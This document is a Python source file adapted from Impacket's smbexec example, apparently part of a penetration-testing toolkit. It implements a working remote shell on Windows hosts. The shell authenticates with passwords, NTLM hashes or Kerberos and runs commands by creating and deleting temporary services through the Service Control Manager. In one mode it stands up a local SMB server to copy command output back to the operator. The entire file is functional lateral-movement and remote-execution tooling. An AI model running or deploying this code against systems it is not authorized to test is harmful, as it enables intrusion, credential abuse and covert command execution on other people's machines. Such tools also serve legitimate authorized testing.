#!/usr/bin/env python
# -*- coding: iso-8859-15 -*-
# -*- Mode: python -*-

import cmd
import os
import random
import string
import sys
from threading import Thread

from lib.logger import logger

try:
    import ConfigParser
except ImportError:
    import configparser as ConfigParser

try:
    from impacket.dcerpc.v5 import scmr, transport
    from impacket import smbserver
except ImportError:
    sys.stderr.write('smbexec: Impacket import error')
    sys.stderr.write('Impacket by SecureAuth Corporation is required for this tool to work. Please download it using:'
                     '\npip: pip install -r requirements.txt\nOr through your package manager:\npython-impacket.')
    sys.exit(255)

################################################################
# Code borrowed and adapted from Impacket's smbexec.py example #
################################################################

OUTPUT_FILENAME = '__output'
BATCH_FILENAME = 'execute.bat'
SMBSERVER_DIR = '__tmp'
DUMMY_SHARE = ''.join(random.choice(string.ascii_uppercase) for _ in range(8))
SERVICE_NAME = 'BTOBTO'
CODEC = sys.stdout.encoding


class SMBServer(Thread):
    def __init__(self):
        Thread.__init__(self)
        self.smb = None

    def cleanup_server(self):
        logger.info('Cleaning up..')
        try:
            os.unlink(SMBSERVER_DIR + '/smb.log')
        except OSError:
            pass
        os.rmdir(SMBSERVER_DIR)

    def run(self):
        # Here we write a mini config for the server
        smbConfig = ConfigParser.ConfigParser()
        smbConfig.add_section('global')
        smbConfig.set('global', 'server_name', 'server_name')
        smbConfig.set('global', 'server_os', 'UNIX')
        smbConfig.set('global', 'server_domain', 'WORKGROUP')
        smbConfig.set('global', 'log_file', SMBSERVER_DIR + '/smb.log')
        smbConfig.set('global', 'credentials_file', '')

        # Let's add a dummy share
        smbConfig.add_section(DUMMY_SHARE)
        smbConfig.set(DUMMY_SHARE, 'comment', '')
        smbConfig.set(DUMMY_SHARE, 'read only', 'no')
        smbConfig.set(DUMMY_SHARE, 'share type', '0')
        smbConfig.set(DUMMY_SHARE, 'path', SMBSERVER_DIR)

        # IPC always needed
        smbConfig.add_section('IPC$')
        smbConfig.set('IPC$', 'comment', '')
        smbConfig.set('IPC$', 'read only', 'yes')
        smbConfig.set('IPC$', 'share type', '3')
        smbConfig.set('IPC$', 'path')

        self.smb = smbserver.SMBSERVER(('0.0.0.0', 445), config_parser=smbConfig)
        logger.info('Creating tmp directory')
        try:
            os.mkdir(SMBSERVER_DIR)
        except Exception as e:
            logger.critical(str(e))
            pass
        logger.info('Setting up SMB Server')
        self.smb.processConfigFile()
        logger.info('Ready to listen...')
        try:
            self.smb.serve_forever()
        except:
            pass

    def stop(self):
        self.cleanup_server()
        self.smb.socket.close()
        self.smb.server_close()
        self._Thread__stop()


class CMDEXEC:
    def __init__(self, remoteName, remoteHost, username='', password='', domain='', lmhash='', nthash='', aesKey=None,
                 doKerberos=False,
                 kdcHost=None, mode=None, share=None, port=445, serviceName=SERVICE_NAME, display=True):

        self.__remoteName = remoteName
        self.__remoteHost = remoteHost
        self.__username = username
        self.__password = password
        self.__port = port
        self.__serviceName = serviceName
        self.__domain = domain
        self.__lmhash = lmhash
        self.__nthash = nthash
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.__share = share
        self.__mode = mode
        self.__display = display
        self.__rpctransport = None
        self.shell = None

    def prep(self):
        stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % self.__remoteName
        logger.debug('StringBinding %s' % stringbinding)
        self.__rpctransport = transport.DCERPCTransportFactory(stringbinding)
        self.__rpctransport.set_dport(self.__port)
        self.__rpctransport.setRemoteHost(self.__remoteHost)
        if hasattr(self.__rpctransport, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            self.__rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash,
                                                self.__nthash, self.__aesKey)
        self.__rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)

    def shell(self):
        self.shell = None
        try:
            if self.__mode == 'SERVER':
                serverThread = SMBServer()
                serverThread.daemon = True
                serverThread.start()
            self.shell = RemoteShell(self.__share, self.__rpctransport, self.__mode,
                                     self.__serviceName, display=self.__display)
            self.shell.cmdloop()
            if self.__mode == 'SERVER':
                serverThread.stop()
        except (Exception, KeyboardInterrupt) as e:
            logger.critical(str(e))
            if self.shell is not None:
                self.shell.finish()
            sys.stdout.flush()
            return

    def onecmd(self, command):
        self.shell = None
        try:
            if self.__mode == 'SERVER':
                serverThread = SMBServer()
                serverThread.daemon = True
                serverThread.start()
            self.shell = RemoteShell(self.__share, self.__rpctransport, self.__mode,
                                     self.__serviceName, display=self.__display)
            self.shell.onecmd(command)
            if self.__mode == 'SERVER':
                serverThread.stop()
        except (Exception, KeyboardInterrupt) as e:
            logger.critical(str(e))
            if self.shell is not None:
                self.shell.finish()
            sys.stdout.flush()
            return


class RemoteShell(cmd.Cmd):
    def __init__(self, share, rpc, mode, serviceName, command='', display=True):
        cmd.Cmd.__init__(self)
        self.__share = share
        self.__mode = mode
        self.__output = '\\\\127.0.0.1\\' + self.__share + '\\' + OUTPUT_FILENAME
        self.__batchFile = '%TEMP%\\' + BATCH_FILENAME
        self.__outputBuffer = b''
        self.__command = command
        self.__shell = '%COMSPEC% /Q /c '
        self.__serviceName = serviceName
        self.__rpc = rpc
        self.__display = display

        self.__scmr = rpc.get_dce_rpc()

        try:
            self.__scmr.connect()
        except Exception as e:
            logger.critical(str(e))
            return

        s = rpc.get_smb_connection()

        # We don't wanna deal with timeouts from now on.
        s.setTimeout(100000)
        if mode == 'SERVER':
            myIPaddr = s.getSMBServer().get_socket().getsockname()[0]
            self.__copyBack = 'copy %s \\\\%s\\%s' % (self.__output, myIPaddr, DUMMY_SHARE)

        self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
        resp = scmr.hROpenSCManagerW(self.__scmr)
        self.__scHandle = resp['lpScHandle']
        self.transferClient = rpc.get_smb_connection()
        self.do_cd('')

    def finish(self):
        # Just in case the service is still created
        try:
            self.__scmr = self.__rpc.get_dce_rpc()
            self.__scmr.connect()
            self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
            resp = scmr.hROpenSCManagerW(self.__scmr)
            self.__scHandle = resp['lpScHandle']
            resp = scmr.hROpenServiceW(self.__scmr, self.__scHandle, self.__serviceName)
            service = resp['lpServiceHandle']
            scmr.hRDeleteService(self.__scmr, service)
            scmr.hRControlService(self.__scmr, service, scmr.SERVICE_CONTROL_STOP)
            scmr.hRCloseServiceHandle(self.__scmr, service)
        except scmr.DCERPCException:
            pass

    def do_shell(self, s):
        os.system(s)

    def do_exit(self, s):
        return True

    def emptyline(self):
        return False

    def do_cd(self, s):
        # We just can't CD or maintain track of the target dir.
        if len(s) > 0:
            logger.error("You can't CD under SMBEXEC. Use full paths.")

        self.execute_remote('cd ')
        if len(self.__outputBuffer) > 0:
            # Stripping CR/LF
            self.prompt = self.__outputBuffer.decode().replace('\r\n', '') + '>'
            self.__outputBuffer = b''

    def do_CD(self, s):
        return self.do_cd(s)

    def default(self, line):
        if line != '':
            self.send_data(line)

    def get_output(self):
        def output_callback(data):
            self.__outputBuffer += data

        if self.__mode == 'SHARE':
            self.transferClient.getFile(self.__share, OUTPUT_FILENAME, output_callback)
            self.transferClient.deleteFile(self.__share, OUTPUT_FILENAME)
        else:
            fd = open(SMBSERVER_DIR + '/' + OUTPUT_FILENAME, 'r')
            output_callback(fd.read())
            fd.close()
            os.unlink(SMBSERVER_DIR + '/' + OUTPUT_FILENAME)

    def execute_remote(self, data):
        command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' 2^>^&1 > ' + self.__batchFile + ' & ' + \
                  self.__shell + self.__batchFile
        if self.__mode == 'SERVER':
            command += ' & ' + self.__copyBack
        command += ' & ' + 'del ' + self.__batchFile

        logger.debug('Executing %s' % command)
        resp = scmr.hRCreateServiceW(self.__scmr, self.__scHandle, self.__serviceName, self.__serviceName,
                                     lpBinaryPathName=command, dwStartType=scmr.SERVICE_DEMAND_START)
        service = resp['lpServiceHandle']

        try:
            scmr.hRStartServiceW(self.__scmr, service)
        except:
            pass
        scmr.hRDeleteService(self.__scmr, service)
        scmr.hRCloseServiceHandle(self.__scmr, service)
        self.get_output()

    def send_data(self, data):
        self.execute_remote(data)
        if self.__display:
            try:
                print(self.__outputBuffer.decode(CODEC))
            except UnicodeDecodeError:
                logger.error('Decoding error detected, consider running chcp.com at the target,\nmap the result with '
                             'https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute smbexec.py '
                             'again with -codec and the corresponding codec')
                print(self.__outputBuffer.decode(CODEC, errors='replace'))
        self.__outputBuffer = b''
